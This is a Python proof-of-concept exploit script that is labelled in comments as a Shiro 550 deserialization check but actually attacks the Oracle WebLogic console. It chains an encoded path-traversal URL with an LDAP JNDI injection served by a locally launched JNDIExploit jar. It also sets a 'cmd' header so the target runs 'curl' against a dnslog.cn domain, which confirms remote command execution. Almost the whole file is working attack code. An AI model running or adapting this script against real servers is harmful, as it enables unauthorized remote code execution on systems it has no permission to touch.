#!/usr/bin/env python
# -*- coding:utf-8 -*-
# author:何则君
# time:2011/11/23
# information shiro 550 反序列化 poc
import os
import random
import subprocess
import signal
import threading
import socket
from time import sleep

import requests

JAR_FILE='JNDIExploit-1.2-SNAPSHOT.jar'



session =requests.Session()
def getdomain():
    try:
        ret = session.get("http://dnslog.cn/getdomain.php?t="+str(random.randint(100000,999999)),timeout=10).text
    except Exception as e:
        print("get dns error as:",e)
        ret="error"
    return ret

def get_host():
    try:
        s= socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        s.connect(('8.8.8.8',80))
        host_ip=s.getsockname()[0]
    finally:
        s.close()
        return host_ip
def getrecords():
    try:
        ret=session.get("http://dnslog.cn/getrecords.php?t="+str(random.randint(100000,999999)),timeout=10).text
    except Exception as e:
        print("get rocords error as:",e)
        ret="error"
    return ret

def JNDIStart(jndi_ip):
    popen = subprocess.Popen(['java', '-jar', f'{JAR_FILE}', '-i', f'{jndi_ip}'],stdout=subprocess.PIPE)
    global pid
    pid=popen.pid

def getdnshost():
    reverhost=""
    try:
        domain=getdomain()
        if domain=="error":
            print("get domain error")
        else:
            reverhost=domain
    except:
        pass
    return reverhost

def check(url,proxies,timeout):
    if proxies:
        proxies = {proxies['protocol']: proxies['protocol'] + '://' + proxies['ip'] + ':' + str(proxies['port'])}
    jndi_ip1=get_host()
    vps=jndi_ip1.split(".")
    jndi_ip=vps[0]+'.'+vps[1]+'.'+vps[2]+';'+vps[3]

    try:
        domain=getdnshost()
        ret = {'success': False, 'response': [], 'requests': [], 'error': [], 'info': []}
        if domain:
            t=threading.Thread(target=JNDIStart,args=(jndi_ip1,))
            t.start()
            sleep(2)
            headers={
                'cmd':f'curl {domain}',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36'
            }
            s=requests.get(url+f'console/css/%252e%252e%252f/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://{jndi_ip}:1389/Basic/WeblogicEcho;AdminServer%22)',timeout=timeout,headers=headers)
            sleep(5)
            try:
                os.kill(pid,signal.SIGKILL)
                pass
            except:
                os.system('taskkill /f /pid %s' % pid)
            t.join()
            sleep(3)
            for i in range(1,5):
                sleep(2)
                temp=getrecords()
                if domain in temp:
                    ret['success']=True
                    break

        else:
            print("get dns host error:")
    except Exception as e:
        ret['error']=e
        pass

    return ret


def main(params):
    result = params.get('result',{})
    url=params.get('url','')
    headers=params.get('headers',{})
    proxies=params.get('proxies',None)      #代理
    timeout=params.get('timeout',5)           #超时时间
    result = check(url,proxies,timeout)
    return result


if __name__ == '__main__':
    params = {
        'result': {'success': False, 'response': [], 'requests': [], 'error': []},
        # headers：传入的header参数
        'headers': {},
        # proxy：传入的代理服务器参数
        'proxies': {'protocol': 'http', 'ip': '127.0.0.1', 'port': 8080},
        'timeout': 30,
        ###可选参数###
        'url': "http://192.168.160.201:7001/",
    }
    print(main(params))